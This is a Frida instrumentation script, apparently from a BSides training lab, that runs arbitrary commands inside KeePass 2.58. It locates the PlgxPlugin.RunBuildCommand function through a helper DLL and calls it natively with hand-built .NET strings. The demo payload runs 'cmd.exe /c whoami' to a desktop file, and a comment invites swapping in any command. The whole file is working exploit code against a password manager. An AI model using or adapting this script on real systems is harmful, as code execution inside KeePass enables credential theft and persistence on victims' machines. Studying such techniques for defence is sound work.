// KeePass Code Execution via RunBuildCommand
// Target function: KeePass.Plugins.PlgxPlugin.RunBuildCommand

function executeViaRunBuildCommand() {
    send("🚀 KeePass Code Execution via RunBuildCommand");
    send("📌 Target: KeePass.Plugins.PlgxPlugin.RunBuildCommand(string strCmd, string strTmpDir, string strCacheDir)");
    
    // Find the correct address for the RunBuildCommand function
    const runBuildCommandAddress = findRunBuildCommandFunction();
    
    if (!runBuildCommandAddress) {
        send("❌ Failed to find the RunBuildCommand function. Cannot proceed.");
        return false;
    }
    
    send(`🔍 Found RunBuildCommand function at address: ${runBuildCommandAddress}`);
    
    try {
        // Define the RunBuildCommand function
        const RunBuildCommand = new NativeFunction(
            ptr(runBuildCommandAddress),
            'void',  // Return type (void)
            ['pointer', 'pointer', 'pointer']  // 3 string parameters
        );
        
        // Command to execute (use any command you want here)
        const command = "cmd.exe /c whoami > C:\\Users\\training\\Desktop\\cmd_output.txt";
        
        // Create strings for parameters (properly formatted for .NET)
        const cmdString = createDotNetString(command);
        const tmpDirString = createDotNetString("C:\\Windows\\Temp");
        const cacheDirString = createDotNetString("C:\\Windows\\Temp");
        
        send(`⚙️ Preparing to execute command: ${command}`);
        
        // Call the RunBuildCommand function
        send("🔥 Calling RunBuildCommand...");
        RunBuildCommand(cmdString, tmpDirString, cacheDirString);
        
        send("✅ RunBuildCommand call completed");
        send(`📝 Check for output file at: C:\\Users\\training\\Desktop\\cmd_output.txt`);
        
        return true;
    } catch (e) {
        send(`❌ Error: ${e.message}`);
        send("⚠️ Error occurred while calling RunBuildCommand. See the error message above for details.");
        return false;
    }
}

// Function to find the RunBuildCommand function
function findRunBuildCommandFunction() {
    send("🔍 Searching for RunBuildCommand function...");
    
    // Load the function enumerator DLL
    const dllPath = "C:\\Users\\training\\Tools\\FunctionEnumerator.dll";
    send("📂 Loading Function Enumerator DLL: " + dllPath);
    const myModule = Module.load(dllPath);
    
    // Define the function prototype for enumerating functions
    const enumerateFunctions = new NativeFunction(
        myModule.getExportByName("EnumerateFunctions"),
        'pointer',
        ['pointer']
    );
    
    // Path to KeePass executable
    const targetAssemblyPath = Memory.allocUtf8String("C:\\Users\\training\\Desktop\\bsides\\victim\\KeePass-2.58\\KeePass.exe");
    
    // Call function enumeration
    send("📊 Enumerating all KeePass functions...");
    const resultPointer = enumerateFunctions(targetAssemblyPath);
    const resultString = resultPointer.readUtf8String();
    
    // Split the result into individual function entries
    const functions = resultString.split("|");
    
    // Look for the RunBuildCommand function
    const runBuildCommandMatch = functions.find(func => 
        func.includes("PlgxPlugin.RunBuildCommand") && 
        func.includes("string strCmd") && 
        func.includes("string strTmpDir") && 
        func.includes("string strCacheDir")
    );
    
    if (runBuildCommandMatch) {
        // Extract the address
        const address = runBuildCommandMatch.substring(runBuildCommandMatch.lastIndexOf(":") + 1);
        send(`✅ Found RunBuildCommand function: ${runBuildCommandMatch}`);
        return address;
    } else {
        // Try a more lenient search if exact match is not found
        const possibleMatches = functions.filter(func => 
            func.includes("RunBuildCommand") || 
            (func.includes("PlgxPlugin") && func.includes("strCmd"))
        );
        
        if (possibleMatches.length > 0) {
            send("⚠️ Found possible matches for RunBuildCommand:");
            possibleMatches.forEach((func, i) => {
                send(`[${i}] ${func}`);
            });
            
            // Use the first match
            const firstMatch = possibleMatches[0];
            const address = firstMatch.substring(firstMatch.lastIndexOf(":") + 1);
            send(`⚠️ Using closest match: ${firstMatch}`);
            return address;
        }
        
        send("❌ Could not find RunBuildCommand function. Check KeePass version or assembly path.");
        return null;
    }
}

// Simple function to create a .NET string (UTF-16 string)
function createDotNetString(str) {
    // Basic .NET string layout:
    // - 8 bytes header
    // - 4 bytes for length
    // - 2 bytes per character (UTF-16)
    
    const length = str.length;
    
    // Allocate memory for the string
    // Header(8) + Length(4) + Characters(length*2) + Null terminator(2)
    const dotNetStr = Memory.alloc(8 + 4 + (length * 2) + 2);
    
    // Write the length at offset 8
    dotNetStr.add(8).writeInt(length);
    
    // Write the string as UTF-16 at offset 12
    for (let i = 0; i < length; i++) {
        dotNetStr.add(12 + (i * 2)).writeU16(str.charCodeAt(i));
    }
    
    return dotNetStr;
}

// Execute the main function
executeViaRunBuildCommand();